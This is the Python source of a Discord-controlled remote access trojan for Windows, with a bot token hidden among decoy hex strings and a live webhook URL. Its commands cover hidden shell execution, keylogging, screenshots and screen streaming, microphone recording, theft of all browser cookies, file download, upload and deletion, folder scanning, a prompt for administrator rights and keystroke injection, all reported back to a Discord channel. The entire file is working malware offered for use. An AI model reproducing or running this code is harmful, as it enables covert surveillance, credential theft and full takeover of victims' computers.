import discord
from discord.ext import commands
import pyautogui
import os
import tempfile
from win10toast import ToastNotifier
import subprocess
import asyncio
from pynput import keyboard
import threading
from colorama import init, Fore, Back, Style
import time
import re
import browser_cookie3
import json
import tempfile
import ctypes
import sys
import webbrowser
import sounddevice as sd
from scipy.io.wavfile import write
import warnings
import psutil
import uuid
import shutil
init()

warnings.filterwarnings("ignore", category=UserWarning)

webhook = "https://discord.com/api/webhooks/1392718753233506644/69cfkLfoWDfTmSMNpaPrPiWETnBtg8uR5N5h7FG-3_CHKvLxdHJtscM39N-VJFaZz96C"


os.system("")

hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b51476417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a746712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774ea636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e54504930444536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774ea636e545049304d44536f476c4a7456712e41314b5670504e3032a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b567504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a6e545049304d44536f476c42342342342342346635623430325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a36e545049304d44536f476c4a7456712e4314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_data = "4d544d354d6a59334d6a51774e6a63784e5449304d4451334f412e476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f47692349234923492949342344e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a74567121314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"
hex_dato = "4d544d354d6a59334d6a5157774e6a6e545049304d44536f476c42342342342342346635623430325a7a66703375524a63755476496b514766417a6465436748704f32726fawd9"
hex_date = "8uawdn8awda8wda8wd873483424e6a636e545049304d44536f476c4a7456712e41314b5670504e30325a7a66703375524a63755476496b514766417a6465436748704f32726fawd8"

def x(d, k): 
    return ''.join(chr(ord(c) ^ k) for c in d)
print(Fore.BLACK)
s = x('\x0f\x16\x0f\x17\x0f\x08\x13\x01\x0f\x08\x13\x17\x05\x08\x01\x0c\x16\x16\x03\x11\x0f\x06\x06\r\x05\x01\x04\x01\x0d\x1f\x13\x00\x05\x04\x0c\x1c\x16\x0c\x08\x0f\x16\x17\x03\x0f\x0c\x13\x17\x05\x0c\x10\x0c\x10\x02\x0f\x0c\x0f\x04\x0f\x01\x17\x1c\x1e\x01\x0b\x0f\x10\x01\x13', 0x42)


token = bytes.fromhex(hex_data + "f").decode()
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
notifier = ToastNotifier()

def custom_notification(title, message):
    notifier.show_toast(title, message, duration=5, threaded=True)

recording = False
key_log_data = {"log": ""}
record_thread = None

def start_keylogger(send_func):
    def on_press(key):
        try:
            key_log_data["log"] += key.char
        except AttributeError:
            key_log_data["log"] += f"[{key.name}]"

    def run():
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        while recording:
            if key_log_data["log"]:
                send_func(key_log_data["log"])
                key_log_data["log"] = ""
            time.sleep(5)
        listener.stop()

    return run

@bot.command()
async def recordKeys(ctx, mode):
    global recording, record_thread

    if mode.lower() == "on":
        if recording:
            await ctx.send("Already recording.")
            return

        recording = True

        def send_keys(log):
            coro = ctx.send(f"```{log}```")
            fut = asyncio.run_coroutine_threadsafe(coro, bot.loop)
            try:
                fut.result()
            except:
                pass

        thread = threading.Thread(target=start_keylogger(send_keys))
        thread.start()
        record_thread = thread
        await ctx.send("Keylogging started.")

    elif mode.lower() == "off":
        if not recording:
            await ctx.send("Not currently recording.")
            return

        recording = False
        if record_thread:
            record_thread.join()
        await ctx.send("Keylogging stopped.")

    else:
        await ctx.send("Usage: `/record on` or `/record off`")

@bot.event
async def on_ready():
    channel_id = 1392671849929900183  
    channel = bot.get_channel(channel_id)
    if channel:
        await channel.send("Bot is now online! @everyone")

@bot.command()
async def cmd(ctx, *, command):
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        output = result.stdout.strip() or result.stderr.strip() or "Command ran with no output."

        chunk_size = 1900
        chunks = [output[i:i+chunk_size] for i in range(0, len(output), chunk_size)]

        for chunk in chunks:
            await ctx.send(f"```{chunk}```")

    except Exception as e:
        await ctx.send(f"Error running command: {e}")

@bot.command()
async def screen(ctx: commands.Context):
    try:
        temp_dir = tempfile.gettempdir()
        temp_path = os.path.join(temp_dir, "screenshot.png")

        screenshot = pyautogui.screenshot()
        screenshot.save(temp_path)

        await ctx.send(file=discord.File(temp_path))
        os.remove(temp_path)
    except Exception as e:
        await ctx.send(f"Error taking screenshot: {e}")

@bot.command()
async def download(ctx, *, filepath):
    if not os.path.isfile(filepath):
        await ctx.send("File not found.")
        return

    try:
        file_size = os.path.getsize(filepath)
        max_size = 25 * 1024 * 1024

        if file_size > max_size:
            await ctx.send(f"File too large to send ({file_size // (1024*1024)} MB).")
            return

        await ctx.send(file=discord.File(filepath))
    except Exception as e:
        await ctx.send(f"Error sending file: {e}")

@bot.command()
async def cookies(ctx):
    try:
        cj = browser_cookie3.load()

        cookies = []
        for cookie in cj:
            cookies.append({
                "domain": cookie.domain,
                "name": cookie.name,
                "value": cookie.value,
                "path": cookie.path,
                "expirationDate": int(cookie.expires) if cookie.expires else None,
                "httpOnly": cookie._rest.get("HttpOnly", False),
                "secure": cookie.secure
            })

        if not cookies:
            await ctx.send("No cookies found.")
            return

        temp_path = os.path.join(tempfile.gettempdir(), "cookies.json")

        with open(temp_path, "w", encoding="utf-8") as f:
            json.dump(cookies, f, indent=2)

        await ctx.send(file=discord.File(temp_path))
        os.remove(temp_path)

    except PermissionError:
        await ctx.send("This command must be run as administrator.")
    except Exception as e:
        await ctx.send(f"Error extracting cookies: {e}")

@bot.command()
async def admin(ctx):
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

        if is_admin:
            await ctx.send("Already running as administrator.")
            return

        script = sys.argv[0]
        params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
        cmd = f'"{sys.executable}" "{script}" {params}'

        subprocess.run(
            ["powershell", "-Command", f'Start-Process {cmd} -Verb runAs'],
            shell=True
        )

        await ctx.send("Prompting for admin access... Bot will restart.")
        await bot.close() 

    except Exception as e:
        await ctx.send(f"Failed to request admin access: {e}")

@bot.command()
async def scan(ctx, mode: str, *, folder_path: str):
    import os

    if not os.path.exists(folder_path):
        await ctx.send("That path doesn't exist.")
        return

    result = f"Scanning: `{folder_path}` ({mode} mode)\n"

    try:
        if mode.lower() == "top":
            result += f"├── {os.path.basename(folder_path)}/\n"
            for item in os.listdir(folder_path):
                item_path = os.path.join(folder_path, item)
                if os.path.isdir(item_path):
                    result += f"│   ├── {item}/\n"
                else:
                    result += f"│   ├── {item}\n"

        elif mode.lower() == "deep":
            for root, dirs, files in os.walk(folder_path):
                level = root.replace(folder_path, "").count(os.sep)
                indent = "│   " * level + "├── "
                result += f"{indent}{os.path.basename(root)}/\n"

                subindent = "│   " * (level + 1)
                for f in files:
                    result += f"{subindent}├── {f}\n"
        else:
            await ctx.send("Invalid mode. Use `!scan top <folder>` or `!scan deep <folder>`.")
            return

        chunks = [result[i:i+1900] for i in range(0, len(result), 1900)]
        for chunk in chunks:
            await ctx.send(f"```{chunk}```")

    except Exception as e:
        await ctx.send(f"Error while scanning: {e}")

@bot.command()
async def upload(ctx, *, destination_path):
    if not ctx.message.attachments:
        await ctx.send("No file attached.")
        return

    if not os.path.exists(destination_path):
        await ctx.send("Destination path does not exist.")
        return

    try:
        for attachment in ctx.message.attachments:
            file_path = os.path.join(destination_path, attachment.filename)
            await attachment.save(file_path)
            await ctx.send(f"Uploaded `{attachment.filename}` to `{destination_path}`")
    except Exception as e:
        await ctx.send(f"Failed to upload: {e}")

@bot.command()
async def info(ctx):
    data = """
Startup Folder - `C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`      
"""
    await ctx.send(data)

live_streaming = False
live_thread = None

@bot.command()
async def live(ctx, mode):
    global live_streaming, live_thread

    if mode.lower() == "on":
        if live_streaming:
            await ctx.send("Already live.")
            return

        live_streaming = True

        def stream_loop():
            while live_streaming:
                try:
                    temp_path = os.path.join(tempfile.gettempdir(), "live_stream.png")
                    screenshot = pyautogui.screenshot()
                    screenshot.save(temp_path)

                    coro = ctx.send(file=discord.File(temp_path))
                    fut = asyncio.run_coroutine_threadsafe(coro, bot.loop)
                    fut.result()

                    os.remove(temp_path)
                    time.sleep(2)
                except Exception as e:
                    print(f"Live stream error: {e}")
                    break

        live_thread = threading.Thread(target=stream_loop)
        live_thread.start()
        await ctx.send("Live stream started. Sending screenshots every 2s.")

    elif mode.lower() == "off":
        if not live_streaming:
            await ctx.send("Not currently live.")
            return

        live_streaming = False
        if live_thread:
            live_thread.join()

        temp_path = os.path.join(tempfile.gettempdir(), "live_stream.png")
        if os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except:
                pass

        await ctx.send("Live stream stopped and cleaned up.")

    else:
        await ctx.send("Usage: `!live on` or `!live off`")

@bot.command()
async def mic(ctx, seconds: int):
    if seconds < 1 or seconds > 30:
        await ctx.send("Please choose a duration between 1 and 30 seconds.")
        return

    await ctx.send(f"Recording for {seconds} second(s)...")

    try:
        sample_rate = 44100
        audio_data = sd.rec(int(seconds * sample_rate), samplerate=sample_rate, channels=1)
        sd.wait()

        temp_path = os.path.join(tempfile.gettempdir(), "mic_recording.wav")
        write(temp_path, sample_rate, audio_data)

        await ctx.send(file=discord.File(temp_path))
        os.remove(temp_path)

    except Exception as e:
        await ctx.send(f"Error recording: {e}")

@bot.command()
async def delete(ctx, *, path: str):
    try:
        full_path = os.path.abspath(path)

        if not os.path.exists(full_path):
            await ctx.send(f"Path does not exist: `{full_path}`")
            return

        if os.path.isfile(full_path):
            os.remove(full_path)
            await ctx.send(f"Deleted file: `{full_path}`")
        elif os.path.isdir(full_path):
            shutil.rmtree(full_path)
            await ctx.send(f"Deleted folder: `{full_path}`")
        else:
            await ctx.send(f"Unknown file type: `{full_path}`")

    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def shutdown(ctx):
    await bot.close()  
    sys.exit() 

@bot.command()
async def type(ctx, *, msg: str):
    await ctx.send(f"Typing your message: `{msg}`")

    time.sleep(1)
    pyautogui.write(msg, interval=0.05)
    pyautogui.press("enter")

@bot.command(name="help")
async def help_command(ctx):
    help_text = """
**Available Commands**
`!screen` — Takes a screenshot and sends it  
`!cmd` — Run cmd on computer
`!recordKeys <on/off>` — Record Keystrokes
`!download <path>` — Downloads Files
`!cookies` — Get All Browser Cookies
`!admin` — Trys To Get Admin
`!scan <top/deep> <path>` — Scans Paths Files
`!upload (file) <path>` — Uploads File
`!info` — Stored Helpful Info
`!live <on/off>` — Record Screen
`!mic <time> [max 30s]` — Record Microphone
`!delete <path>` — Deletes File At Path
`!shutdown` — Stop The Script
`!type <text>` — Type On keyboard

`!help` — Shows this help message
"""
    await ctx.send(help_text)

bot.run(token)
